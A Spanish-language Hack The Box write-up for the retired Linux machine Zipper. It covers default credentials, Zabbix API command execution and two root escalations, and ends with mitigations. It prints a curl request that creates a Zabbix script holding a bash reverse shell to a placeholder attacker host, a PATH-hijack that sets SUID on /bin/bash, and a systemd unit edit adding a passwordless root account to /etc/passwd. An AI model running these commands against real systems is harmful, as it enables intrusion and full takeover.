---
machine: Zipper
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, zabbix, api, command-injection, suid, privesc]
---

# Zipper — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Zabbix Agent en 10050 y la interfaz web permiten adivinar `zapper:zapper`. La API de Zabbix permite crear un script y ejecutarlo en el agente, lo que da una shell como `zabbix`. Para root, un binario SUID llama a `system` sin ruta absoluta y permite un PATH hijack; alternativamente, el servicio systemd de backup es escribible y se ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,10050 <IP>
```

- `22` SSH, `80` Apache con Zabbix y `10050` el agente.
- La interfaz muestra reportes y el nombre de un script de backup de `zapper`.
- El login acepta `zapper:zapper` aunque la GUI esté deshabilitada.

## Enumeración

- La API `/zabbix/api_jsonrpc.php` autentica a `zapper`.
- `user.login` devuelve un token y `script.get` lista scripts existentes.
- `script.create` permite definir un comando y `execute_on: 0` para el agente.

## Foothold

Se crea un script con una reverse shell y se ejecuta en el host del agente; la shell corre como `zabbix`.

```bash
curl -s -X POST 'http://<IP>/zabbix/api_jsonrpc.php' -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"script.create","params":{"name":"pwn","command":"bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\"","execute_on":0},"auth":"<TOKEN>","id":1}'
```

## Movimiento lateral

La enumeración local muestra `/home/zapper/utils/zabbix-service`, un binario SUID que llama a `system("systemctl ...")` sin ruta absoluta, y `/etc/systemd/system/purge-backups.service`, escribible por `zapper` y ejecutado como root cada cinco minutos.

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /home/zapper/utils/zabbix-service /etc/systemd/system/purge-backups.*
```

## Escalada de privilegios

La primera vía es un PATH hijack: se coloca un `systemctl` falso en `/tmp` y se ejecuta el SUID.

```bash
export PATH=/tmp:$PATH
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/systemctl && chmod +x /tmp/systemctl
/home/zapper/utils/zabbix-service
/bin/bash -p
```

La segunda vía modifica el `ExecStart` del servicio escribible para crear un usuario root o añadir una clave; el timer lo ejecuta en el siguiente ciclo.

```bash
printf '[Service]\nExecStart=/bin/bash -c "echo pwn::0:0::/root:/bin/bash >> /etc/passwd"\n' > /etc/systemd/system/purge-backups.service
```

## Evidencia

- `zapper:zapper` y token de API.
- Script creado y shell como `zabbix`.
- SUID `zabbix-service` y `purge-backups.service` escribible.
- PATH hijack o cron y root.

## Lecciones aprendidas

- Una contraseña igual al usuario puede dar acceso a la API aunque la GUI esté bloqueada.
- La API de Zabbix puede ejecutar comandos en los agentes.
- Un SUID que llama a `system` sin ruta absoluta es una escalada trivial.

## Mitigación y detección

- Cambiar credenciales por defecto y restringir la API.
- Limitar `execute_on` y los scripts de Zabbix.
- Usar rutas absolutas y permisos de solo lectura en scripts de root.

## Referencias

- [0xdf — Zipper](https://0xdf.gitlab.io/2019/02/23/htb-zipper.html)
- [IppSec — Zipper](https://www.youtube.com/watch?v=RLvFwiDK_F8)
- [Hack The Box — Zipper](https://app.hackthebox.com/machines/zipper)
